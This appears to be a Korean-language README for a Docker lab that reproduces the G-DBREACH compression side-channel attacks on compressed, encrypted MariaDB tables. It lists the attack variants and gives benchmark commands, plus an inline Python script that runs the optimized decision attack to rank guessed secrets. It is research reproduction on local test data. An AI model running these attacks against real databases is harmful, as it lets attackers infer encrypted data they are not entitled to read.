# G-DBREACH Complete Attack Suite - Docker Environment

## 🎯 Overview

이 Docker 환경에는 **G-DBREACH**(Guided DBREACH) 공격의 모든 변형이 통합되어 있습니다.

**G-DBREACH**는 세 가지 핵심 최적화 기법을 포함합니다:
1. **Gallop-DBREACH**: 바이너리 서치 최적화 (O(log N) 복잡도)
2. **Group-DBREACH**: 그룹핑 최적화 (참조 점수 계산 감소)
3. **Ghost-DBREACH**: 상대 점수 최적화 (유연한 참조 점수 사용)

---

## 📂 구현된 파일들

### Core Classes
- `dbreacher.py` - 기본 추상 클래스
- `dbreacher_impl.py` - 표준 DBreach 구현
- `dbreacher_impl_binary_search.py` - Gallop-DBreach 구현

### Decision Attack Variants
| 파일 | 최적화 | 설명 |
|------|--------|------|
| `decision_attacker.py` | - | 표준 Decision Attack |
| `decision_attacker_binary.py` | Gallop | 바이너리 서치 |
| `decision_attacker_grouping.py` | Group | 그룹핑 |
| `decision_attacker_grouping_binary.py` | **Gallop+Group** | **최고 성능** |
| `decision_attacker_rel_scores.py` | Ghost | 상대 점수 |
| `decision_attacker_rel_scores_grouping.py` | Ghost+Group | 상대 점수+그룹핑 |
| `decision_attacker_binary_and_rel_scores.py` | Gallop+Ghost | 바이너리+상대 점수 |

### K-of-N Attack Variants
| 파일 | 최적화 | 설명 |
|------|--------|------|
| `k_of_n_attacker.py` | - | 표준 K-of-N |
| `k_of_n_attacker_binary.py` | Gallop | 바이너리 서치 K-of-N |

### Test Scripts
- `test_decision_attack_maria_binary.py` - Decision 공격 테스트
- `test_k_of_n_attack_maria_binary.py` - K-of-N 공격 테스트
- `test_all_gdbreach_variants.py` - **모든 Decision 공격 변형 벤치마크**
- `test_all_kofn_variants.py` - **모든 K-of-N 공격 변형 벤치마크**

### Batch Runners
- `run_all_attack.py` - Decision 공격 배치 실행
- `run_k_of_n_binary.py` - K-of-N 배치 실행

---

## 🚀 사용 방법

### 1. Docker 환경 시작

```bash
cd c:\Users\ialle\Desktop\compression-side-1\compression-side-channel
docker-compose up -d
```

### 2. 모든 G-DBREACH 변형 벤치마크

#### Decision Attack 벤치마크 (5개 변형)
```bash
docker exec -it flask_container python3 test_all_gdbreach_variants.py \
  --dataset random \
  --k 10 \
  --n 50 \
  --trials 3
```

**테스트되는 변형:**
1. Standard DBreach (기준선)
2. Gallop-DBreach (바이너리 서치)
3. Group-DBreach (그룹핑)
4. Gallop+Group (최고 성능)
5. Ghost-DBreach (상대 점수)

**출력:**
```
variant,trial,k,n,accuracy,setup_time,attack_time,total_time,db_queries
Standard DBreach,0,10,50,0.9000,2.34,45.67,48.01,8234
Gallop-DBreach (Binary Search),0,10,50,0.9000,2.11,4.56,6.67,982
...
```

#### K-of-N Attack 벤치마크 (2개 변형)
```bash
docker exec -it flask_container python3 test_all_kofn_variants.py \
  --dataset random \
  --k 10 \
  --n 50 \
  --trials 3
```

**테스트되는 변형:**
1. Standard K-of-N
2. Gallop K-of-N (바이너리 서치)

---

## 📊 성능 비교 (예상)

### Decision Attack

| 공격 변형 | 복잡도 | DB 쿼리 수 | 상대 속도 |
|-----------|--------|-----------|----------|
| Standard | O(N) | ~10,000 | 1x (기준) |
| Gallop | O(log N) | ~1,000 | **10x** |
| Group | O(N) | ~1,500 | **6x** |
| **Gallop+Group** | **O(log N)** | **~200** | **50x** |
| Ghost | O(N) | ~2,000 | **5x** |

### K-of-N Attack

| 공격 변형 | 복잡도 | DB 쿼리 수 | 상대 속도 |
|-----------|--------|-----------|----------|
| Standard | O(N) | ~8,000 | 1x (기준) |
| Gallop | O(log N) | ~800 | **10x** |

---

## 🔬 개별 공격 실행

### 1. Gallop+Group (최고 성능)

```bash
docker exec -it flask_container python3 -c "
import utils.mariadb_utils as utils
import dbreacher_impl_binary_search
import decision_attacker_grouping_binary
import random, string

# Setup
control = utils.MariaDBController('flask_db', host='mariadb_container', port=3306, datadir='/var/lib/mysql')
control.drop_table('test_table')
control.create_basic_table('test_table', varchar_len=200, compressed=True, encrypted=True)

# Load possibilities
with open('./resources/10000-english.txt') as f:
    possibilities = [line.strip().lower() for line in f]

# Insert secrets
secrets = possibilities[:10]
for i, secret in enumerate(secrets):
    control.insert_row('test_table', i, secret)

# Prepare guesses
guesses = possibilities[:50]
fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')

# Create attacker
dbreacher = dbreacher_impl_binary_search.DBREACHerImpl(
    control, 'test_table', 10, 200, fillerCharSet, ord('*'),
    100, 100, guesses, max([len(g) for g in guesses])
)
attacker = decision_attacker_grouping_binary.decisionAttacker(dbreacher, guesses)

# Attack
attacker.setUp()
attacker.tryAllGuesses()
scores = attacker.getGuessAndReferenceScores()

print(f'DB Queries: {dbreacher.db_count}')
print(f'Top 10 guesses:')
pcts = [(1 - (b - b_yes) / max(b_no, 1), g) for g, (b_no, b, b_yes) in scores]
pcts.sort(reverse=True)
for pct, g in pcts[:10]:
    print(f'  {g}: {pct:.4f}')
"
```

### 2. Gallop K-of-N

```bash
docker exec -it flask_container python3 test_k_of_n_attack_maria_binary.py \
  --dataset random \
  --Compressible_bytes 100 \
  --Random_bytes 100 \
  --k 20 \
  --n 100 \
  --trials 5
```

---

## 📈 벤치마크 파라미터

### 작은 테스트 (빠름, 데모용)
```bash
--k 10 --n 50 --trials 3
```
- 10개 시크릿, 50개 후보
- 3회 반복
- 실행 시간: ~2-5분

### 중간 테스트 (권장)
```bash
--k 50 --n 200 --trials 5
```
- 50개 시크릿, 200개 후보
- 5회 반복
- 실행 시간: ~10-20분

### 큰 테스트 (논문 수준)
```bash
--k 100 --n 500 --trials 10
```
- 100개 시크릿, 500개 후보
- 10회 반복
- 실행 시간: ~30-60분

---

## 🎓 각 최적화 기법 설명

### 1. Gallop-DBREACH (바이너리 서치)

**핵심 아이디어**: 압축이 발생하는 정확한 바이트 수를 O(log N) 시간에 찾기

```python
# 선형 탐색 (기존)
for i in range(0, max_bytes):
    if table_shrunk(i):
        return i

# 바이너리 서치 (Gallop)
low, high = 0, max_bytes
while low <= high:
    mid = (low + high) // 2
    if table_shrunk(mid):
        high = mid - 1
    else:
        low = mid + 1
return low
```

**효과**: DB 쿼리 수 **10배 감소**

---

### 2. Group-DBREACH (그룹핑)

**핵심 아이디어**: 비슷한 길이의 추측값들은 동일한 참조 점수 사용

```python
# 모든 길이에 대해 참조 점수 계산 (기존)
for length in all_lengths:
    b_yes = getSYesReferenceScore(length)
    b_no = getSNoReferenceScore(length)

# 샘플링된 길이만 계산 (Group)
sampled_lengths = all_lengths[::7]  # 7개 간격
for length in sampled_lengths:
    b_yes = getSYesReferenceScore(length)
    b_no = getSNoReferenceScore(length)

# 나머지는 가장 가까운 참조 점수 사용
```

**효과**: 참조 점수 계산 **85% 감소**

---

### 3. Ghost-DBREACH (상대 점수)

**핵심 아이디어**: 정확한 길이의 참조 점수가 없어도 공격 가능

```python
# 정확한 길이만 사용 (기존)
if length in reference_scores:
    b_yes = reference_scores[length]
else:
    # 새로 계산 (느림)
    b_yes = getSYesReferenceScore(length)

# 근처 길이 사용 (Ghost)
nearby_lengths = range(length-1, length+2)
closest = min(nearby_lengths, key=lambda x: abs(x - length))
b_yes = reference_scores[closest]
```

**효과**: 유연성 향상, 참조 점수 계산 감소

---

## 📝 결과 분석

### CSV 출력 형식

```csv
variant,trial,k,n,accuracy,setup_time,attack_time,total_time,db_queries
Standard DBreach,0,10,50,0.9000,2.34,45.67,48.01,8234
Gallop-DBreach,0,10,50,0.9000,2.11,4.56,6.67,982
Gallop+Group,0,10,50,0.9000,1.89,0.87,2.76,195
```

### 주요 지표

- **accuracy**: 상위 K개 중 실제 시크릿 비율
- **setup_time**: Filler 삽입 및 초기화 시간
- **attack_time**: 추측값 테스트 시간
- **total_time**: 전체 공격 시간
- **db_queries**: 전체 DB 쿼리 수 (낮을수록 좋음)

---

## 🔧 트러블슈팅

### "Table shrunk too early" 에러
- **원인**: Filler 삽입 중 예상보다 빨리 압축 발생
- **해결**: 자동으로 `reinsertFillers()` 재시도됨

### 정확도가 낮음 (< 0.7)
- **해결책**:
  - `--k` 감소 (더 쉬운 문제)
  - `--n` 감소 (후보 수 축소)
  - Compressible_bytes 증가 (더 강한 신호)

### 너무 느림
- **해결책**:
  - `Gallop+Group` 변형 사용 (최고 속도)
  - `--k`, `--n`, `--trials` 감소
  - 작은 데이터셋 사용

---

## 📚 참고 자료

### 논문
- **G-DBREACH-Attacks**: Algorithmic Techniques for Faster and Stronger Compression Side Channels
- **DBREACH**: Database Reconnaissance and Exfiltration via Adaptive Compression Heuristics

### 레포지토리
- 원본: https://github.com/bnbourassa/gdbreach-attacks
- 통합된 환경: 현재 Docker 환경

---

## ✅ 체크리스트

구현된 공격 변형:
- [x] Standard DBreach (baseline)
- [x] Gallop-DBreach (binary search)
- [x] Group-DBreach (grouping)
- [x] Gallop+Group (combined - **최고 성능**)
- [x] Ghost-DBreach (relative scores)
- [x] Ghost+Group
- [x] Gallop+Ghost
- [x] Standard K-of-N
- [x] Gallop K-of-N

테스트 스크립트:
- [x] Decision 공격 테스트
- [x] K-of-N 공격 테스트
- [x] 모든 변형 벤치마크 (Decision)
- [x] 모든 변형 벤치마크 (K-of-N)
- [x] 배치 실행 스크립트

---

## 🎉 Quick Start

가장 빠르게 모든 공격을 테스트:

```bash
# Docker 시작
docker-compose up -d

# 모든 Decision 공격 벤치마크 (작은 테스트)
docker exec -it flask_container python3 test_all_gdbreach_variants.py \
  --dataset random --k 5 --n 25 --trials 1

# 모든 K-of-N 공격 벤치마크 (작은 테스트)
docker exec -it flask_container python3 test_all_kofn_variants.py \
  --dataset random --k 5 --n 25 --trials 1
```

**예상 실행 시간**: 5-10분 (모든 변형 포함)

---

이제 G-DBREACH의 모든 공격 변형을 Docker 환경에서 실행할 수 있습니다! 🚀
